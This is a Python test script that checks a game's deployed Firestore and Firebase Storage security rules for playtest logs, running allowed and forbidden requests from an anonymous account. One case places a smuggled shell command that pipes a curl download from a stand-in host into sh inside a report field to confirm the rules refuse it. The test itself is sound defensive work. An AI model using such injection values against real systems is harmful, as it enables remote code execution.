#!/usr/bin/env python3
"""Check the deployed Firestore rules of the playtest logs, as a game client would hit them.

Signs up an anonymous account (like the game), tries what the game does and what it must not be able to do, prints
PASS/FAIL per case, then deletes its test documents with the developer's gcloud credentials.

    python tools/logs/check_rules.py
"""
import json
import subprocess
import sys
import urllib.error
import urllib.request
from datetime import datetime, timedelta, timezone

PROJECT = "corruption-du-portail"
API_KEY = "AIzaSyD72okoz-olxXghpFhNaT6XjiWHTVzzVxM"  # the game's Web API key (not a secret)
BASE = f"https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents"


def call(method, url, body=None, token=None, admin=False):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if admin:
        headers["x-goog-user-project"] = PROJECT
    req = urllib.request.Request(url, data=json.dumps(body).encode() if body is not None else None, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def upload(url, data, token):
    req = urllib.request.Request(url, data=data, method="POST",
                                 headers={"Content-Type": "image/jpeg", "Authorization": f"Bearer {token}"})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def ts(dt):
    return {"timestampValue": dt.strftime("%Y-%m-%dT%H:%M:%SZ")}


def main():
    code, text = call("POST", f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={API_KEY}", {"returnSecureToken": True})
    if code != 200:
        sys.exit(f"sign-up failed {code} {text[:300]}")
    auth = json.loads(text)
    tok, uid = auth["idToken"], auth["localId"]
    now = datetime.now(timezone.utc)
    sid = now.strftime("%Y%m%d-%H%M%S") + "-0c0c0d"  # the game's session id format (reports require it)
    good_session = {"uid": {"stringValue": uid}, "sid": {"stringValue": sid}, "expireAt": ts(now + timedelta(days=60)),
                    "player": {"stringValue": "RulesCheck"}}
    mask = "?" + "&".join(f"updateMask.fieldPaths={k}" for k in good_session)

    def chunk(seq, **extra):
        f = {"sid": {"stringValue": sid}, "seq": {"integerValue": str(seq)}, "lines": {"stringValue": '{"t":1}\n'},
             "expireAt": ts(now + timedelta(days=60))}
        f.update(extra)
        return {"fields": f}

    rid = now.strftime("%Y%m%d-%H%M%S") + "-0c0c0c"

    def report(**extra):
        f = {"uid": {"stringValue": uid}, "id": {"stringValue": rid}, "kind": {"stringValue": "report"},
             "sid": {"stringValue": sid}, "gameId": {"stringValue": ""}, "player": {"stringValue": "RulesCheck"},
             "seat": {"stringValue": "3"}, "flavor": {"stringValue": "relay"}, "day": {"integerValue": "1"},
             "t": ts(now), "text": {"stringValue": "rules check"}, "capture": {"stringValue": f"reports/{rid}.jpg"},
             "expireAt": ts(now + timedelta(days=60))}
        f.update(extra)
        return {"fields": f}

    storage = f"https://firebasestorage.googleapis.com/v0/b/{PROJECT}.firebasestorage.app/o"
    jpg = bytes([0xFF, 0xD8, 0xFF, 0xD9])

    cases = [
        ("config/logging readable", "GET", f"{BASE}/config/logging", None, 200),
        ("other config doc unreadable", "GET", f"{BASE}/config/other", None, 403),
        ("session create", "PATCH", f"{BASE}/sessions/{sid}{mask}", {"fields": good_session}, 200),
        ("session extra field refused", "PATCH", f"{BASE}/sessions/{sid}?updateMask.fieldPaths=evil",
         {"fields": {"evil": {"stringValue": "x"}}}, 403),
        ("session far expiry refused", "PATCH", f"{BASE}/sessions/{sid}?updateMask.fieldPaths=expireAt",
         {"fields": {"expireAt": ts(now + timedelta(days=400))}}, 403),
        ("session of another uid refused", "PATCH", f"{BASE}/sessions/{sid}-x{mask.replace(sid, sid)}",
         {"fields": dict(good_session, uid={"stringValue": "someone-else"}, sid={"stringValue": sid + "-x"})}, 403),
        ("chunk create", "POST", f"{BASE}/sessions/{sid}/chunks?documentId=000000", chunk(0), 200),
        ("same chunk again = ALREADY_EXISTS", "POST", f"{BASE}/sessions/{sid}/chunks?documentId=000000", chunk(0), 409),
        ("chunk seq/path mismatch refused", "POST", f"{BASE}/sessions/{sid}/chunks?documentId=000005", chunk(1), 403),
        ("chunk extra field refused", "POST", f"{BASE}/sessions/{sid}/chunks?documentId=000001",
         chunk(1, evil={"stringValue": "x"}), 403),
        ("chunk overwrite refused", "PATCH", f"{BASE}/sessions/{sid}/chunks/000000", chunk(0), 403),
        ("session read refused", "GET", f"{BASE}/sessions/{sid}", None, 403),
        ("report create", "POST", f"{BASE}/reports?documentId={rid}", report(), 200),
        ("same report again = ALREADY_EXISTS", "POST", f"{BASE}/reports?documentId={rid}", report(), 409),
        ("report of another uid refused", "POST", f"{BASE}/reports?documentId={rid[:-1]}1",
         report(uid={"stringValue": "someone-else"}, id={"stringValue": rid[:-1] + "1"}), 403),
        ("report text over 2000 refused", "POST", f"{BASE}/reports?documentId={rid[:-1]}2",
         report(id={"stringValue": rid[:-1] + "2"}, text={"stringValue": "x" * 2001}), 403),
        ("report read refused", "GET", f"{BASE}/reports/{rid}", None, 403),
        ("report with a command in gameId refused", "POST", f"{BASE}/reports?documentId={rid[:-1]}3",
         report(id={"stringValue": rid[:-1] + "3"}, gameId={"stringValue": "x; curl evil|sh #"}), 403),
        ("report on someone else's session refused", "POST", f"{BASE}/reports?documentId={rid[:-1]}4",
         report(id={"stringValue": rid[:-1] + "4"}, sid={"stringValue": "20200101-000000-000000"}), 403),
        ("report with an old timestamp refused", "POST", f"{BASE}/reports?documentId={rid[:-1]}5",
         report(id={"stringValue": rid[:-1] + "5"}, t=ts(now - timedelta(days=90))), 403),
        ("report with a long flavor refused", "POST", f"{BASE}/reports?documentId={rid[:-1]}6",
         report(id={"stringValue": rid[:-1] + "6"}, flavor={"stringValue": "x" * 2000}), 403),
        ("capture upload", "BYTES", f"{storage}?uploadType=media&name=reports%2F{rid}.jpg", jpg, 200),
        ("capture overwrite refused", "BYTES", f"{storage}?uploadType=media&name=reports%2F{rid}.jpg", jpg, 403),
        ("capture read refused", "GET", f"{storage}/reports%2F{rid}.jpg?alt=media", None, 403),
        ("capture outside reports/ refused", "BYTES", f"{storage}?uploadType=media&name=evil%2F{rid}.jpg", jpg, 403),
    ]
    failed = 0
    for name, method, url, body, expected in cases:
        if method == "BYTES":
            code, text = upload(url, body, tok)
        else:
            code, text = call(method, url, body, tok)
        ok = code == expected
        failed += not ok
        print(f"{'PASS' if ok else 'FAIL'}  {name}: got {code}, expected {expected}" + ("" if ok else f"  {text[:200]}"))

    admin = subprocess.run("gcloud auth print-access-token", shell=True, capture_output=True, text=True).stdout.strip()
    for path in (f"sessions/{sid}/chunks/000000", f"sessions/{sid}", f"reports/{rid}"):
        call("DELETE", f"{BASE}/{path}", token=admin, admin=True)
    call("DELETE", f"https://storage.googleapis.com/storage/v1/b/{PROJECT}.firebasestorage.app/o/reports%2F{rid}.jpg",
         token=admin, admin=True)
    print("ALL PASS" if not failed else f"{failed} FAIL")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
